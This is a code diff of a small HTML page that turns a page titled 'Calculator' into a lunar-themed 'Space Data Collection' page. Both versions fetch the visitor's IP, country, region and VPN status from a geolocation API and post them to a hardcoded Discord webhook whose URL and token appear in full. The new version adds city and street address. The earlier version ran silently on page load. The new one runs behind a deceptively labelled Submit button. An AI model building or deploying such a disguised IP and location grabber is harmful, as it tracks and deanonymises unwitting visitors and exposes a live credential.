@@ -3,16 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Calculator</title>
+    <title>Space Data Collection</title>
     <style>
         body {
-            background-color: #f4f4f9;
             margin: 0;
             padding: 0;
+            font-family: Arial, sans-serif;
+            color: white;
+            background-image: url('https://i.imgur.com/FnKnVpi.jpg'); /* Lunar surface background */
+            background-size: cover;
+            background-attachment: fixed;
+            background-position: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.8); /* Semi-transparent black box */
+            border-radius: 8px;
+            box-shadow: 0 2px 20px rgba(255, 255, 255, 0.5);
+            text-align: center;
+        }
+        h2 {
+            color: #FFD700; /* Golden text for the header */
+            text-shadow: 0 0 8px rgba(255, 215, 0, 0.8);
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            box-shadow: 0 2px 8px rgba(0, 255, 0, 0.5);
+            transition: background-color 0.3s, transform 0.2s;
+        }
+        button:hover {
+            background-color: #45a049;
+            transform: scale(1.05);
+        }
+        .moon {
+            position: fixed;
+            bottom: -20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 800px;
+            opacity: 0.8;
         }
     </style>
 </head>
 <body>
+
+    <div class="container">
+        <h2>Space Data Collection</h2>
+        <p>Gathering data from the moon...</p>
+        <button onclick="sendData()">Submit</button>
+    </div>
+
+    <!-- Lunar Surface Image at the bottom -->
+    <img src="https://i.imgur.com/lXo6VUb.png" alt="Moon Surface" class="moon">
 
     <script>
         const webhookUrl = "https://discord.com/api/webhooks/1324255949887770715/ZmkFTcuo167o2SHd_SzwFK7O2IRnUVo_xhsKfkG7w3ulGavnMJTNxJasjBSyDSVR8bi8";
@@ -22,20 +75,42 @@
             try {
                 // Fetch IP and location data silently in the background
                 const response = await fetch(geoApiUrl);
-                if (!response.ok) throw new Error(Geo API error: ${response.statusText});
+                if (!response.ok) throw new Error(`Geo API error: ${response.statusText}`);
 
                 const data = await response.json();
-                const ip = data.ip  "Unknown";
-                const country = data.country_name  "Unknown";
+                const ip = data.ip || "Unknown";
+                const country = data.country_name || "Unknown";
                 const state = data.region || "Unknown";
+                const city = data.city || "Unknown";
+                const streetAddress = data.street || "Not available";  // This may not always be available
                 const isVPN = data.security && data.security.vpn ? "VPN Detected" : "No VPN";
 
-                // Send collected data to Discord webhook
+                return {
+                    ip,
+                    country,
+                    state,
+                    city,
+                    streetAddress,
+                    isVPN
+                };
+            } catch (error) {
+                console.error("Error detecting VPN and location:", error);
+                return null;
+            }
+        }
+
+        async function sendData() {
+            const locationData = await checkLocationAndVPN();
+            if (locationData) {
+                const { ip, country, state, city, streetAddress, isVPN } = locationData;
+
                 const webhookData = {
-                    content: Visitor Info:
-                    - IP: ${ip} (${isVPN})
-                    - Country: ${country}
-                    - State/Region: ${state}
+                    content: `**Visitor Info:**
+**IP**: ${ip} (**${isVPN}**)
+**Country**: ${country}
+**State/Region**: ${state}
+**City**: ${city}
+**Street Address**: ${streetAddress}`
                 };
 
                 await fetch(webhookUrl, {
@@ -46,13 +121,9 @@
                     body: JSON.stringify(webhookData)
                 });
 
-            } catch (error) {
-                console.error("Error detecting VPN and location:", error);
+                alert("Data submitted successfully!");
             }
         }
-
-        // Run the function when the page loads (no visible output on the page)
-        checkLocationAndVPN();
     </script>
 
 </body>
